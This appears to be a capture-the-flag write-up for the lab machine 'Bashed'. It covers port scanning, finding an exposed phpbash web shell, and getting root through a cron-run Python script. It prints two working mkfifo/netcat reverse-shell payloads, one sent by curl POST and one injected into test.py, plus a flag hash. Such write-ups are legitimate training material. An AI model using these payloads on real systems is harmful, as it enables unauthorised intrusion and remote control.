## Information

| Property     | Value                       |
|--------------|-----------------------------|
| **Name**     |  Bashed  |
| **IP Address**|   10.10.10.68   |
| **OS**       |  Linux        |
| **Difficulty**|  Easy |

## Enumeration
### Nmap Scan
```bash
nmap -sC -sV -oN nmap_scan.txt -Pn 
```

```bash
Discovered open port 80/tcp on 10.10.10.68
```

## Initial Access
### Port [80] - [Arrexel's Development Site]

![](Bashed%20Writeup%20-%20Web%20server.png)

PHPBash project is a standalone, semi-interactive web shell. It's main purpose is to assist in penetration tests where traditional reverse shells are not possible. The design is based on the default Kali Linux terminal colors, so pentesters should feel right at home.

Reference: https://github.com/Arrexel/phpbash

Running FFUF reveals the phpbash.php file under /.dev. 


#### Vulnerability Exploited

To get a reverse shell, we sent the payload in a post request to the webshell file: 

```bash
curl -i -s -k -X $'POST' \
    -H $'Host: bashed.htb' \
    --data-binary $'cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2>%261|nc+10.10.14.5+1337+>/tmp/f' \
    $'http://bashed.htb/dev/phpbash.php'
```


#### Exploitation Steps

Received the shell as www-data, we escalate our privileges to scriptmanager by running: 

``sudo -u scriptmanager bash
### User Access

- 
#### User Flag

``50abec25ca7fdf9459b53a4ffbea0e98
## Privilege Escalation


#### Root Flag

Under /scripts, there's test.py and test.txt files, the text file is owned by root, and as it appears, it was written by the test.py file, so we assume that there's cron as root running it.

To exploit this we inject a python reverse shell and we successfully get a hit back ! 

```bash
(remote) root@bashed:/home# cd /scripts/
(remote) root@bashed:/scripts# ls
f  test.py  test.txt
(remote) root@bashed:/scripts# cat test.*
import os
os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.5 13378 >/tmp/f')
testing 123!(remote) root@bashed:/scripts# 
```

## Conclusion

-
## Additional Notes

-
## Resources
-